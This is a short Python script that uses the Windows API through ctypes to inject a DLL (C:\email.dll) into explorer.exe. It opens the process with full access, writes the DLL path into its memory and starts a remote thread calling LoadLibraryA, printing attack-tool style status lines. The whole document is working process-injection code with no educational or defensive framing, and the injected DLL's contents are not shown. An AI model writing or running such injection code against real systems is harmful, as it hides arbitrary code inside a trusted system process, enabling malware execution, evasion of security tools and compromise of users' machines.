import ctypes
import ctypes.wintypes as wintypes
import psutil
import win32con

dll_path = "C:\\email.dll"

# Find explorer.exe PID
explorer_pid = None
for proc in psutil.process_iter(['pid', 'name']):
    if proc.info['name'].lower() == 'explorer.exe':
        explorer_pid = proc.info['pid']
        break

if not explorer_pid:
    raise Exception("Could not find explorer.exe")

print(f"[*] Explorer.exe PID: {explorer_pid}")

# Open process with all access
kernel32 = ctypes.windll.kernel32
h_process = kernel32.OpenProcess(0x1F0FFF, False, explorer_pid)
if not h_process:
    raise Exception("Failed to get handle to explorer.exe")

# Allocate memory in target process
dll_path_bytes = dll_path.encode('utf-8')
path_len = len(dll_path_bytes) + 1
arg_address = kernel32.VirtualAllocEx(h_process, 0, path_len, win32con.MEM_COMMIT, win32con.PAGE_READWRITE)
if not arg_address:
    raise Exception("Failed to allocate memory in target process")

# Write DLL path into allocated memory
written = ctypes.c_size_t(0)
if not kernel32.WriteProcessMemory(h_process, arg_address, dll_path_bytes, path_len, ctypes.byref(written)):
    raise Exception("Failed to write to target process memory")

# Get LoadLibraryA address
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
if not h_loadlib:
    raise Exception("Failed to get address of LoadLibraryA")

# Create remote thread to load DLL
thread_id = ctypes.c_ulong(0)
if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, ctypes.byref(thread_id)):
    raise Exception("Failed to create remote thread")

print("[+] DLL injection successful.")
